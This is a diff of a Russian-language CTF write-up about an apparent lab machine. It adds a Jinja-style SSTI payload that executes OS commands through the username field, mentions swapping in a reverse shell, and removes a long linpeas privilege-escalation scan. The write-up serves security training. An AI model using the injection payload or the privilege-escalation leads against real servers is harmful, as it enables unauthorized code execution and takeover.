@@ -89,15 +89,26 @@ SSTI (Server-Side Template Injection) — это опасная уязвимос
 RCE (от англ. Remote Code Execution — удаленное выполнение / исполнение кода) — это опасная уязвимость программного обеспечения, которая позволяет злоумышленнику запустить произвольный код на целевом компьютере или сервере через локальную сеть или интернет
 ---
 
-в первый момент я попробовал отправить запрос без переменной и получил ответ что это не корректное содержимое username, так я и понял что там нужно работать с username, первый раз я решил ввести туда сообщение "username":"admin" и увидел ошибку - sorry, admin, our... тут я и понял что есть возможность проверки ssti
+в первый момент я попробовал отправить запрос без переменной и получил ответ, что это некорректное содержимое username, так я и понял что там нужно работать с username, первый делом раз я решил ввести туда сообщение "username":"admin" и увидел ошибку - sorry, **admin**, our... тут я и понял что есть возможность проверки ssti
+
+для начала я решил проверить базовый пайлоуд {{8*8}} и увидел что сервер отвечает так, как это делает уязвимый сервер
 
 <img width="1489" height="726" alt="{1C60B2E7-3231-470F-B1AE-7862148D2805}" src="https://github.com/user-attachments/assets/e3147daa-6fe6-4598-aeca-4ef7d3848b9a" />
 
+тут я уже ввел poc ssti который выглядит так - {{lipsum.__globals__['os'].popen('id').read()}} - вместо id я подставил команду для revshell
+
 <img width="784" height="173" alt="{17E11B39-39A3-45B0-A203-5087225C3964}" src="https://github.com/user-attachments/assets/02a19493-044f-4b85-9954-2ac3404c0445" />
+
+как мы видим я получил rce
 
 # LPE
 
-Вот мы и на машине, прежде чем использовать сканера и искать через них способ lpe я решаю побегать по директориям и посмотреть что тут есть интересное
+---
+LPE означает локальное повышение привилегий (от англ. Local Privilege Escalation)
+---
+
+
+Прежде чем использовать сканера и искать через них способы к LPE я решаю побегать по директориям и посмотреть что тут есть интересное
 
 ```
 azrael@forge:~/snap$ ls -la
@@ -159,8 +170,10 @@ grep '^lxd:' /etc/group
 lxd:x:117:
 azrael@forge:~/snap/lxd/common/config$ 
 ```
-как мы видим я не состою в группе lxd так что не смогу получить root от него, я посмотреть дальше все, но ничего не нашел так что использвоал linpeas
+как мы видим моя первая попытка поиска не увенчалась успехом, я не состою в группе lxd, так что не смогу получить root от него, посмотрев еще какое то время директории я перешел к использованию linpeas 
 
+
+#### Ответ linpeas (сокращенный) 
 ```
 azrael@forge://tmp$ ./linpeas.sh
 
@@ -1547,759 +1560,12 @@ drwxr-xr-x 2 root root 200 Feb  7  2023 /snap/core20/1828/usr/share/keyrings
 drwxr-xr-x 2 root root 200 Apr 16  2024 /snap/core20/2318/usr/share/keyrings
 drwxr-xr-x 2 root root 4096 Aug 15  2024 /usr/share/keyrings
 
-
-
-
-╔══════════╣ Analyzing Postfix Files (limit 70)
--rw-r--r-- 1 root root 813 Feb  2  2020 /snap/core20/1828/usr/share/bash-completion/completions/postfix                                                                                 
-
--rw-r--r-- 1 root root 813 Feb  2  2020 /snap/core20/2318/usr/share/bash-completion/completions/postfix
-
--rw-r--r-- 1 root root 761 Nov 15  2021 /usr/share/bash-completion/completions/postfix
-
-
-╔══════════╣ Analyzing DNS Files (limit 70)
--rw-r--r-- 1 root root 826 Nov 15  2021 /usr/share/bash-completion/completions/bind                                                                                                     
--rw-r--r-- 1 root root 826 Nov 15  2021 /usr/share/bash-completion/completions/bind
-
-
-
-
-╔══════════╣ Analyzing Other Interesting Files (limit 70)
--rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc                                                                                                                              
--rw-r--r-- 1 azrael azrael 3771 Feb 25  2020 /home/azrael/.bashrc
--rw-r--r-- 1 root root 3771 Feb 25  2020 /snap/core20/1828/etc/skel/.bashrc
--rw-r--r-- 1 root root 3771 Feb 25  2020 /snap/core20/2318/etc/skel/.bashrc
-
-
-
-
-
--rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skel/.profile
--rw-r--r-- 1 azrael azrael 807 Feb 25  2020 /home/azrael/.profile
--rw-r--r-- 1 root root 807 Feb 25  2020 /snap/core20/1828/etc/skel/.profile
--rw-r--r-- 1 root root 807 Feb 25  2020 /snap/core20/2318/etc/skel/.profile
-
-
-
-
-╔══════════╣ Analyzing FreeIPA Files (limit 70)
-drwxr-xr-x 2 root root 4096 Aug 15  2024 /usr/src/linux-headers-5.15.0-118/drivers/net/ipa                                                                                              
-
-
-
-
-╔══════════╣ Searching mysql credentials and exec
-                                                                                                                                                                                        
-MySQL process not found.
-╔══════════╣ Analyzing PGP-GPG Files (limit 70)
-/usr/bin/gpg                                                                                                                                                                            
-netpgpkeys Not Found
-netpgp Not Found                                                                                                                                                                        
-                                                                                                                                                                                        
--rw-r--r-- 1 root root 2794 Mar 26  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
--rw-r--r-- 1 root root 1733 Mar 26  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
--rw------- 1 azrael azrael 1200 Mar 22  2024 /home/azrael/.gnupg/trustdb.gpg
--rw-r--r-- 1 root root 7399 Sep 17  2018 /snap/core20/1828/usr/share/keyrings/ubuntu-archive-keyring.gpg
--rw-r--r-- 1 root root 6713 Oct 27  2016 /snap/core20/1828/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
--rw-r--r-- 1 root root 4097 Feb  6  2018 /snap/core20/1828/usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
--rw-r--r-- 1 root root 0 Jan 17  2018 /snap/core20/1828/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
--rw-r--r-- 1 root root 1227 May 27  2010 /snap/core20/1828/usr/share/keyrings/ubuntu-master-keyring.gpg
--rw-r--r-- 1 root root 7399 Sep 17  2018 /snap/core20/2318/usr/share/keyrings/ubuntu-archive-keyring.gpg
--rw-r--r-- 1 root root 6713 Oct 27  2016 /snap/core20/2318/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
--rw-r--r-- 1 root root 4097 Feb  6  2018 /snap/core20/2318/usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
--rw-r--r-- 1 root root 0 Jan 17  2018 /snap/core20/2318/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
--rw-r--r-- 1 root root 1227 May 27  2010 /snap/core20/2318/usr/share/keyrings/ubuntu-master-keyring.gpg
--rw-r--r-- 1 root root 2899 Jul  4  2022 /usr/share/gnupg/distsigkey.gpg
--rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
--rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
--rw-r--r-- 1 root root 3023 Mar 26  2021 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
--rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
--rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
--rw-r--r-- 1 root root 1150 Apr 30  2024 /usr/share/keyrings/ubuntu-pro-anbox-cloud.gpg
--rw-r--r-- 1 root root 2247 Apr 30  2024 /usr/share/keyrings/ubuntu-pro-cc-eal.gpg
--rw-r--r-- 1 root root 2274 Apr 30  2024 /usr/share/keyrings/ubuntu-pro-cis.gpg
--rw-r--r-- 1 root root 2236 Apr 30  2024 /usr/share/keyrings/ubuntu-pro-esm-apps.gpg
--rw-r--r-- 1 root root 2264 Apr 30  2024 /usr/share/keyrings/ubuntu-pro-esm-infra.gpg
--rw-r--r-- 1 root root 2275 Apr 30  2024 /usr/share/keyrings/ubuntu-pro-fips.gpg
--rw-r--r-- 1 root root 2275 Apr 30  2024 /usr/share/keyrings/ubuntu-pro-fips-preview.gpg
--rw-r--r-- 1 root root 2250 Apr 30  2024 /usr/share/keyrings/ubuntu-pro-realtime-kernel.gpg
--rw-r--r-- 1 root root 2235 Apr 30  2024 /usr/share/keyrings/ubuntu-pro-ros.gpg
-
-
-drwx------ 3 azrael azrael 4096 Oct  2 04:18 /home/azrael/.gnupg
-
-
-╔══════════╣ Searching uncommon passwd files (splunk)
-passwd file: /etc/pam.d/passwd                                                                                                                                                          
-passwd file: /etc/passwd
-passwd file: /snap/core20/1828/etc/pam.d/passwd
-passwd file: /snap/core20/1828/etc/passwd
-passwd file: /snap/core20/1828/usr/share/bash-completion/completions/passwd
-passwd file: /snap/core20/1828/usr/share/lintian/overrides/passwd
-passwd file: /snap/core20/1828/var/lib/extrausers/passwd
-passwd file: /snap/core20/2318/etc/pam.d/passwd
-passwd file: /snap/core20/2318/etc/passwd
-passwd file: /snap/core20/2318/usr/share/bash-completion/completions/passwd
-passwd file: /snap/core20/2318/usr/share/lintian/overrides/passwd
-passwd file: /snap/core20/2318/var/lib/extrausers/passwd
-passwd file: /usr/share/bash-completion/completions/passwd
-passwd file: /usr/share/lintian/overrides/passwd
-
-╔══════════╣ Searching ssl/ssh files
-╔══════════╣ Analyzing SSH Files (limit 70)                                                                                                                                             
-                                                                                                                                                                                        
-
-
-
-
--rw-r--r-- 1 root root 602 Mar 20  2024 /etc/ssh/ssh_host_dsa_key.pub
--rw-r--r-- 1 root root 174 Mar 20  2024 /etc/ssh/ssh_host_ecdsa_key.pub
--rw-r--r-- 1 root root 94 Mar 20  2024 /etc/ssh/ssh_host_ed25519_key.pub
--rw-r--r-- 1 root root 566 Mar 20  2024 /etc/ssh/ssh_host_rsa_key.pub
-
-UsePAM yes
-══╣ Some certificates were found (out limited):
-/etc/pki/fwupd/LVFS-CA.pem                                                                                                                                                              
-/etc/pki/fwupd-metadata/LVFS-CA.pem
-/etc/pollinate/entropy.ubuntu.com.pem
-/etc/ssl/certs/ACCVRAIZ1.pem
-/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
-/etc/ssl/certs/AC_RAIZ_FNMT-RCM_SERVIDORES_SEGUROS.pem
-/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
-/etc/ssl/certs/AffirmTrust_Commercial.pem
-/etc/ssl/certs/AffirmTrust_Networking.pem
-/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
-/etc/ssl/certs/AffirmTrust_Premium.pem
-/etc/ssl/certs/Amazon_Root_CA_1.pem
-/etc/ssl/certs/Amazon_Root_CA_2.pem
-/etc/ssl/certs/Amazon_Root_CA_3.pem
-/etc/ssl/certs/Amazon_Root_CA_4.pem
-/etc/ssl/certs/ANF_Secure_Server_Root_CA.pem
-/etc/ssl/certs/Atos_TrustedRoot_2011.pem
-/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068_2.pem
-/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
-/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
-4366PSTORAGE_CERTSBIN
-
-══╣ Writable ssh and gpg agents
-/etc/systemd/user/sockets.target.wants/gpg-agent-browser.socket                                                                                                                         
-/etc/systemd/user/sockets.target.wants/gpg-agent.socket
-/etc/systemd/user/sockets.target.wants/gpg-agent-ssh.socket
-/etc/systemd/user/sockets.target.wants/gpg-agent-extra.socket
-══╣ Some home ssh config file was found
-/usr/share/openssh/sshd_config                                                                                                                                                          
-Include /etc/ssh/sshd_config.d/*.conf
-KbdInteractiveAuthentication no
-UsePAM yes
-X11Forwarding yes
-PrintMotd no
-AcceptEnv LANG LC_*
-Subsystem       sftp    /usr/lib/openssh/sftp-server
-
-══╣ /etc/hosts.allow file found, trying to read the rules:
-/etc/hosts.allow                                                                                                                                                                        
-
-
-Searching inside /etc/ssh/ssh_config for interesting info
-Include /etc/ssh/ssh_config.d/*.conf
-Host *
-    SendEnv LANG LC_*
-    HashKnownHosts yes
-    GSSAPIAuthentication yes
-
-╔══════════╣ Searching tmux sessions
-╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-shell-sessions                                                                                   
-tmux 3.2a                                                                                                                                                                               
-
-
-/tmp/tmux-1000
-
-
-
-                      ╔════════════════════════════════════╗
-══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                      
-                      ╚════════════════════════════════════╝                                                                                                                            
-╔══════════╣ SUID - Check easy privesc, exploits and write perms
-╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                         
-strings Not Found                                                                                                                                                                       
--rwsr-xr-x 1 root root 71K Feb  6  2024 /usr/bin/gpasswd                                                                                                                                
--rwsr-xr-x 1 root root 72K Feb  6  2024 /usr/bin/chfn  --->  SuSE_9.3/10
--rwsr-xr-x 1 root root 40K Feb  6  2024 /usr/bin/newgrp  --->  HP-UX_10.20
--rwsr-xr-x 1 root root 59K Feb  6  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
--rwsr-xr-x 1 root root 227K Apr  3  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
--rwsr-xr-x 1 root root 47K Apr  9  2024 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
--rwsr-xr-x 1 root root 35K Apr  9  2024 /usr/bin/umount  --->  BSD/Linux(08-1996)
--rwsr-xr-x 1 root root 55K Apr  9  2024 /usr/bin/su
--rwsr-xr-x 1 root root 31K Feb 26  2022 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
--rwsr-xr-x 1 root root 44K Feb  6  2024 /usr/bin/chsh
--rwsr-sr-x 1 daemon daemon 55K Apr 14  2022 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
--rwsr-xr-x 1 root root 35K Mar 23  2022 /usr/bin/fusermount3
--rwsr-xr-x 1 root root 19K Feb 26  2022 /usr/libexec/polkit-agent-helper-1
--rwsr-xr-x 1 root root 331K Jun 26  2024 /usr/lib/openssh/ssh-keysign
--rwsr-xr-- 1 root messagebus 35K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
--rwsr-xr-x 1 root root 148K Jul 26  2024 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
--rwsr-xr-x 1 root root 121K Jan 25  2023 /snap/snapd/18357/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
--rwsr-xr-x 1 root root 133K Apr 24  2024 /snap/snapd/21759/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
--rwsr-xr-x 1 root root 84K Feb  6  2024 /snap/core20/2318/usr/bin/chfn  --->  SuSE_9.3/10
--rwsr-xr-x 1 root root 52K Feb  6  2024 /snap/core20/2318/usr/bin/chsh
--rwsr-xr-x 1 root root 87K Feb  6  2024 /snap/core20/2318/usr/bin/gpasswd
--rwsr-xr-x 1 root root 55K Apr  9  2024 /snap/core20/2318/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
--rwsr-xr-x 1 root root 44K Feb  6  2024 /snap/core20/2318/usr/bin/newgrp  --->  HP-UX_10.20
--rwsr-xr-x 1 root root 67K Feb  6  2024 /snap/core20/2318/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
--rwsr-xr-x 1 root root 67K Apr  9  2024 /snap/core20/2318/usr/bin/su
--rwsr-xr-x 1 root root 163K Apr  4  2023 /snap/core20/2318/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
--rwsr-xr-x 1 root root 39K Apr  9  2024 /snap/core20/2318/usr/bin/umount  --->  BSD/Linux(08-1996)
--rwsr-xr-- 1 root systemd-resolve 51K Oct 25  2022 /snap/core20/2318/usr/lib/dbus-1.0/dbus-daemon-launch-helper
--rwsr-xr-x 1 root root 467K Jan  2  2024 /snap/core20/2318/usr/lib/openssh/ssh-keysign
--rwsr-xr-x 1 root root 84K Nov 29  2022 /snap/core20/1828/usr/bin/chfn  --->  SuSE_9.3/10
--rwsr-xr-x 1 root root 52K Nov 29  2022 /snap/core20/1828/usr/bin/chsh
--rwsr-xr-x 1 root root 87K Nov 29  2022 /snap/core20/1828/usr/bin/gpasswd
--rwsr-xr-x 1 root root 55K Feb  7  2022 /snap/core20/1828/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
--rwsr-xr-x 1 root root 44K Nov 29  2022 /snap/core20/1828/usr/bin/newgrp  --->  HP-UX_10.20
--rwsr-xr-x 1 root root 67K Nov 29  2022 /snap/core20/1828/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
--rwsr-xr-x 1 root root 67K Feb  7  2022 /snap/core20/1828/usr/bin/su
--rwsr-xr-x 1 root root 163K Jan 16  2023 /snap/core20/1828/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
--rwsr-xr-x 1 root root 39K Feb  7  2022 /snap/core20/1828/usr/bin/umount  --->  BSD/Linux(08-1996)
--rwsr-xr-- 1 root systemd-resolve 51K Oct 25  2022 /snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
--rwsr-xr-x 1 root root 463K Mar 30  2022 /snap/core20/1828/usr/lib/openssh/ssh-keysign
-
-╔══════════╣ SGID
-╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                         
--rwxr-sr-x 1 root shadow 27K Jan 10  2024 /usr/sbin/unix_chkpwd                                                                                                                         
--rwxr-sr-x 1 root shadow 23K Jan 10  2024 /usr/sbin/pam_extrausers_chkpwd
--rwxr-sr-x 1 root _ssh 287K Jun 26  2024 /usr/bin/ssh-agent
--rwxr-sr-x 1 root shadow 71K Feb  6  2024 /usr/bin/chage
--rwxr-sr-x 1 root shadow 23K Feb  6  2024 /usr/bin/expiry
--rwxr-sr-x 1 root crontab 39K Mar 23  2022 /usr/bin/crontab
--rwsr-sr-x 1 daemon daemon 55K Apr 14  2022 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
--rwxr-sr-x 1 root utmp 15K Mar 24  2022 /usr/lib/x86_64-linux-gnu/utempter/utempter
--rwxr-sr-x 1 root shadow 83K Feb  6  2024 /snap/core20/2318/usr/bin/chage
--rwxr-sr-x 1 root shadow 31K Feb  6  2024 /snap/core20/2318/usr/bin/expiry
--rwxr-sr-x 1 root crontab 343K Jan  2  2024 /snap/core20/2318/usr/bin/ssh-agent
--rwxr-sr-x 1 root shadow 43K Jan 10  2024 /snap/core20/2318/usr/sbin/pam_extrausers_chkpwd
--rwxr-sr-x 1 root shadow 43K Jan 10  2024 /snap/core20/2318/usr/sbin/unix_chkpwd
--rwxr-sr-x 1 root shadow 83K Nov 29  2022 /snap/core20/1828/usr/bin/chage
--rwxr-sr-x 1 root shadow 31K Nov 29  2022 /snap/core20/1828/usr/bin/expiry
--rwxr-sr-x 1 root crontab 343K Mar 30  2022 /snap/core20/1828/usr/bin/ssh-agent
--rwxr-sr-x 1 root tty 35K Feb  7  2022 /snap/core20/1828/usr/bin/wall
--rwxr-sr-x 1 root shadow 43K Feb  2  2023 /snap/core20/1828/usr/sbin/pam_extrausers_chkpwd
--rwxr-sr-x 1 root shadow 43K Feb  2  2023 /snap/core20/1828/usr/sbin/unix_chkpwd
-
-╔══════════╣ Files with ACLs (limited to 50)
-╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls                                                                                                  
-files with acls in searched folders Not Found                                                                                                                                           
-                                                                                                                                                                                        
-╔══════════╣ Capabilities
-╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                                                                          
-══╣ Current shell capabilities                                                                                                                                                          
-./linpeas.sh: 8305: [[: not found                                                                                                                                                       
-CapInh:  [Invalid capability format]
-./linpeas.sh: 8305: [[: not found
-CapPrm:  [Invalid capability format]
-./linpeas.sh: 8296: [[: not found
-CapEff:  [Invalid capability format]
-./linpeas.sh: 8305: [[: not found
-CapBnd:  [Invalid capability format]
-./linpeas.sh: 8305: [[: not found
-CapAmb:  [Invalid capability format]
-
-╚ Parent process capabilities
-./linpeas.sh: 8330: [[: not found                                                                                                                                                       
-CapInh:  [Invalid capability format]
-./linpeas.sh: 8330: [[: not found
-CapPrm:  [Invalid capability format]
-./linpeas.sh: 8321: [[: not found
-CapEff:  [Invalid capability format]
-./linpeas.sh: 8330: [[: not found
-CapBnd:  [Invalid capability format]
-./linpeas.sh: 8330: [[: not found
-CapAmb:  [Invalid capability format]
-
-
-Files with capabilities (limited to 50):
-/usr/bin/mtr-packet cap_net_raw=ep
-/usr/bin/ping cap_net_raw=ep
-/snap/core20/2318/usr/bin/ping cap_net_raw=ep
-/snap/core20/1828/usr/bin/ping cap_net_raw=ep
-
-╔══════════╣ Users with capabilities
-╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                                                                          
-                                                                                                                                                                                        
-╔══════════╣ Checking misconfigurations of ld.so
-╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso                                                                                                  
-/etc/ld.so.conf                                                                                                                                                                         
-Content of /etc/ld.so.conf:                                                                                                                                                             
-include /etc/ld.so.conf.d/*.conf
-
-/etc/ld.so.conf.d
-  /etc/ld.so.conf.d/libc.conf                                                                                                                                                           
-  - /usr/local/lib                                                                                                                                                                      
-  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
-  - /usr/local/lib/x86_64-linux-gnu                                                                                                                                                     
-  - /lib/x86_64-linux-gnu
-  - /usr/lib/x86_64-linux-gnu
-
-/etc/ld.so.preload
-╔══════════╣ Files (scripts) in /etc/profile.d/                                                                                                                                         
-╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files                                                                                        
-total 64                                                                                                                                                                                
-drwxr-xr-x   2 root root  4096 Aug 15  2024 .
-drwxr-xr-x 120 root root 12288 Sep 20  2024 ..
--rw-r--r--   1 root root    96 Dec  5  2019 01-locale-fix.sh
--rw-r--r--   1 root root   835 Dec  1  2022 apps-bin-path.sh
--rw-r--r--   1 root root   726 Nov 15  2021 bash_completion.sh
--rw-r--r--   1 root root  1107 Nov  3  2019 gawk.csh
--rw-r--r--   1 root root   757 Nov  3  2019 gawk.sh
--rw-r--r--   1 root root   349 Oct 28  2020 im-config_wayland.sh
--rw-r--r--   1 root root  1368 Jun 12  2024 vte-2.91.sh
--rw-r--r--   1 root root   966 Jun 12  2024 vte.csh
--rw-r--r--   1 root root   954 Mar 26  2020 xdg_dirs_desktop_session.sh
--rw-r--r--   1 root root  1557 Feb 17  2020 Z97-byobu.sh
--rwxr-xr-x   1 root root   841 Feb 27  2024 Z99-cloudinit-warnings.sh
--rwxr-xr-x   1 root root  3396 Jun  5  2024 Z99-cloud-locale-test.sh
-
-╔══════════╣ Permissions in init, init.d, systemd, and rc.d
-╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                                                                            
-                                                                                                                                                                                        
-╔══════════╣ AppArmor binary profiles
--rw-r--r-- 1 root root  3500 Jan 31  2023 sbin.dhclient                                                                                                                                 
--rw-r--r-- 1 root root  3448 Mar 17  2022 usr.bin.man
--rw-r--r-- 1 root root  1687 Feb  8  2024 usr.bin.tcpdump
--rw-r--r-- 1 root root 29450 Apr 24  2024 usr.lib.snapd.snap-confine.real
--rw-r--r-- 1 root root   672 Feb 19  2020 usr.sbin.ippusbxd
--rw-r--r-- 1 root root  1592 Nov 16  2021 usr.sbin.rsyslogd
-
-═╣ Hashes inside passwd file? ........... No
-═╣ Writable passwd file? ................ No                                                                                                                                            
-═╣ Credentials in fstab/mtab? ........... No                                                                                                                                            
-═╣ Can I read shadow files? ............. No                                                                                                                                            
-═╣ Can I read shadow plists? ............ No                                                                                                                                            
-═╣ Can I write shadow plists? ........... No                                                                                                                                            
-═╣ Can I read opasswd file? ............. No                                                                                                                                            
-═╣ Can I write in network-scripts? ...... No                                                                                                                                            
-═╣ Can I read root folder? .............. No                                                                                                                                            
-                                                                                                                                                                                        
-╔══════════╣ Searching root files in home dirs (limit 30)
-/home/                                                                                                                                                                                  
-/root/
-/var/www
-/var/www/cloudsite.thm
-/var/www/cloudsite.thm/about_us.html
-/var/www/cloudsite.thm/services.html
-/var/www/cloudsite.thm/assets
-/var/www/cloudsite.thm/assets/webfonts
-/var/www/cloudsite.thm/assets/webfonts/fa-light-300.ttf
-/var/www/cloudsite.thm/assets/webfonts/fa-regular-400.svg
-/var/www/cloudsite.thm/assets/webfonts/fa-light-300.svg
-/var/www/cloudsite.thm/assets/webfonts/fa-brands-400.ttf
-/var/www/cloudsite.thm/assets/webfonts/fa-solid-900.eot
-/var/www/cloudsite.thm/assets/webfonts/fa-brands-400.woff
-/var/www/cloudsite.thm/assets/webfonts/fa-brands-400.woff2
-/var/www/cloudsite.thm/assets/webfonts/fa-light-300.woff2
-/var/www/cloudsite.thm/assets/webfonts/fa-solid-900.woff
-/var/www/cloudsite.thm/assets/webfonts/fa-light-300.eot
-/var/www/cloudsite.thm/assets/webfonts/fa-regular-400.ttf
-/var/www/cloudsite.thm/assets/webfonts/fa-solid-900.svg
-/var/www/cloudsite.thm/assets/webfonts/fa-brands-400.svg
-/var/www/cloudsite.thm/assets/webfonts/fa-regular-400.woff
-/var/www/cloudsite.thm/assets/webfonts/fa-solid-900.woff2
-/var/www/cloudsite.thm/assets/webfonts/fa-light-300.woff
-/var/www/cloudsite.thm/assets/webfonts/fa-regular-400.woff2
-/var/www/cloudsite.thm/assets/webfonts/fa-brands-400.eot
-/var/www/cloudsite.thm/assets/webfonts/fa-solid-900.ttf
-/var/www/cloudsite.thm/assets/webfonts/fa-regular-400.eot
-/var/www/cloudsite.thm/assets/css
-/var/www/cloudsite.thm/assets/css/fontawsom-all.min.css
-
-╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
-                                                                                                                                                                                        
-╔══════════╣ Readable files belonging to root and readable by me but not world readable
-                                                                                                                                                                                        
-╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
-╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                        
-/home/azrael                                                                                                                                                                            
-/run/lock
-/run/screen
-/run/screen/S-azrael
-/tmp
-/tmp/.font-unix
-/tmp/.ICE-unix
-/tmp/linpeas.sh
-/tmp/.Test-unix
-/tmp/tmux-1000
-#)You_can_write_even_more_files_inside_last_directory
-
-/var/crash
-/var/tmp
-
-╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
-╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                        
-                                                                                                                                                                                        
-
-╔══════════╣ Writable root-owned executables I can modify (max 200)
-╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                        
-Writable root-owned executables Not Found                                                                                                                                               
-                                                                                                                                                                                        
-
-
-                            ╔═════════════════════════╗
-════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                                                                     
-                            ╚═════════════════════════╝                                                                                                                                 
-╔══════════╣ .sh files in path
-╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                                                                                
-/usr/local/bin/generate_erlang_cookie.sh                                                                                                                                                
-/usr/local/bin/change_cookie_permissions.sh
-/usr/bin/gettext.sh
-/usr/bin/rescan-scsi-bus.sh
-
-╔══════════╣ Executable files potentially added by user (limit 70)
-2024-09-11+17:46:16.9320045090 /usr/local/bin/change_cookie_permissions.sh                                                                                                              
-2024-09-11+11:51:24.4639998210 /usr/local/bin/generate_erlang_cookie.sh
-2024-08-15+16:53:58.1417942040 /home/azrael/.local/bin/flask
-2024-08-15+09:24:28.4794334960 /usr/local/bin/node
-2024-08-15+09:14:13.4008479310 /etc/console-setup/cached_setup_terminal.sh
-2024-08-15+09:14:13.3968477190 /etc/console-setup/cached_setup_keyboard.sh
-2024-08-15+09:14:13.3968477190 /etc/console-setup/cached_setup_font.sh
-2024-07-18+07:13:52.1825728390 /home/azrael/.local/bin/gunicorn
-
-╔══════════╣ Unexpected in root
-/core                                                                                                                                                                                   
-/swap.img
-
-╔══════════╣ Modified interesting files in the last 5mins (limit 100)
-/var/log/auth.log                                                                                                                                                                       
-/var/log/syslog
-/var/log/journal/c68c5f14902144269ba40f1cba092dfd/user-1000.journal
-/var/log/journal/c68c5f14902144269ba40f1cba092dfd/system.journal
-/var/log/rabbitmq/erl_crash.dump
-
-╔══════════╣ Syslog configuration (limit 50)
-                                                                                                                                                                                        
-
-
-module(load="imuxsock") # provides support for local system logging
-
-
-
-module(load="imklog" permitnonkernelfacility="on")
-
-
-$ActionFileDefaultTemplate RSYSLOG_TraditionalFileFormat
-
-$RepeatedMsgReduction on
-
-$FileOwner syslog
-$FileGroup adm
-$FileCreateMode 0640
-$DirCreateMode 0755
-$Umask 0022
-$PrivDropToUser syslog
-$PrivDropToGroup syslog
-
-$WorkDirectory /var/spool/rsyslog
-
-$IncludeConfig /etc/rsyslog.d/*.conf
-╔══════════╣ Auditd configuration (limit 50)
-auditd configuration Not Found                                                                                                                                                          
-╔══════════╣ Log files with potentially weak perms (limit 50)                                                                                                                           
-   131286     28 -rw-r-----   1 root     adm         25960 Sep 12  2024 /var/log/dmesg.2.gz                                                                                             
-   131832    568 -rw-r-----   1 syslog   adm        579894 Sep  9  2024 /var/log/kern.log.3.gz
-   133696    324 -rw-r-----   1 syslog   adm        325016 Oct  2 03:10 /var/log/cloud-init.log
